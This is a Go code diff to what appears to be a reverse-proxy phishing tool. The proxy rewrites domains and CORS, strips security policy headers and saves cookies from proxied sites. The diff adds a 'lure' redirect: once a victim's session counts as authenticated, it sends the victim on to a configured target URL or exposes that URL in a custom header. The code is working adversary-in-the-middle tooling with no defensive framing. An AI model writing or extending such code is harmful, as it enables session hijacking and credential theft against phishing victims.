@@ -10,13 +10,19 @@ import (
 	"github.com/gofiber/fiber/v2"
 )
 
+const HeaderTargetURL = "X-Target-Url"
+
+type AuthService interface {
+	IsAuthenticated(c *fiber.Ctx) bool
+}
+
 type ResponseProcessor interface {
 	Process(c *fiber.Ctx, resp *http.Response)
 }
 
 func NewResponseProcessor(conv DomainConverter, urlProc, htmlProc RegexProcessor,
-	cookieSaver CookieSaver) ResponseProcessor {
-	return &responseProcessor{conv, urlProc, htmlProc, cookieSaver}
+	cookieSaver CookieSaver, authService AuthService, lureService LureService) ResponseProcessor {
+	return &responseProcessor{conv, urlProc, htmlProc, cookieSaver, authService, lureService}
 }
 
 type responseProcessor struct {
@@ -24,16 +30,45 @@ type responseProcessor struct {
 	urlProc     RegexProcessor
 	htmlProc    RegexProcessor
 	cookieSaver CookieSaver
+	authService AuthService
+	lureService LureService
 }
 
 func (p *responseProcessor) Process(c *fiber.Ctx, resp *http.Response) {
+	p.writeCookies(c, resp)
+	if p.targetRedirect(c, resp) {
+		return
+	}
 	p.convertCORS(resp)
 	p.removePolicyHeaders(resp)
 	p.convertLocation(resp)
-	p.writeCookies(c, resp)
 	p.writeHeaders(c, resp)
 	p.writeBody(c, resp)
 	c.Status(resp.StatusCode)
+}
+
+//nolint:errcheck
+func (p *responseProcessor) targetRedirect(c *fiber.Ctx, resp *http.Response) bool {
+	if !p.authService.IsAuthenticated(c) {
+		return false
+	}
+	sess := getSession(c)
+	lure, err := p.lureService.GetByURL(getLureURL(sess))
+	if err != nil {
+		log.Println("lureService error: ", err)
+		return false
+	}
+	if lure == nil {
+		return false
+	}
+	contentType := p.getContentType(resp)
+	if strings.Contains(contentType, "text/html") {
+		// TODO log error
+		c.Status(fiber.StatusFound).Redirect(lure.TargetURL)
+		return true
+	}
+	resp.Header[HeaderTargetURL] = []string{lure.TargetURL}
+	return false
 }
 
 func (p *responseProcessor) convertCORS(resp *http.Response) {
@@ -42,6 +77,13 @@ func (p *responseProcessor) convertCORS(resp *http.Response) {
 		proxyOrigin := p.conv.ToProxyDomain(originHeader[0])
 		resp.Header["Access-Control-Allow-Origin"] = []string{proxyOrigin}
 		resp.Header["Access-Control-Allow-Credentials"] = []string{"true"}
+		exposeHeaders := resp.Header["Access-Control-Expose-Headers"]
+		if len(exposeHeaders) == 0 {
+			resp.Header["Access-Control-Expose-Headers"] = []string{HeaderTargetURL}
+		} else if exposeHeaders[0] != "*" {
+			exposeHeaders = append(exposeHeaders, HeaderTargetURL)
+			resp.Header["Access-Control-Expose-Headers"] = []string{strings.Join(exposeHeaders, ",")}
+		}
 	}
 }
 
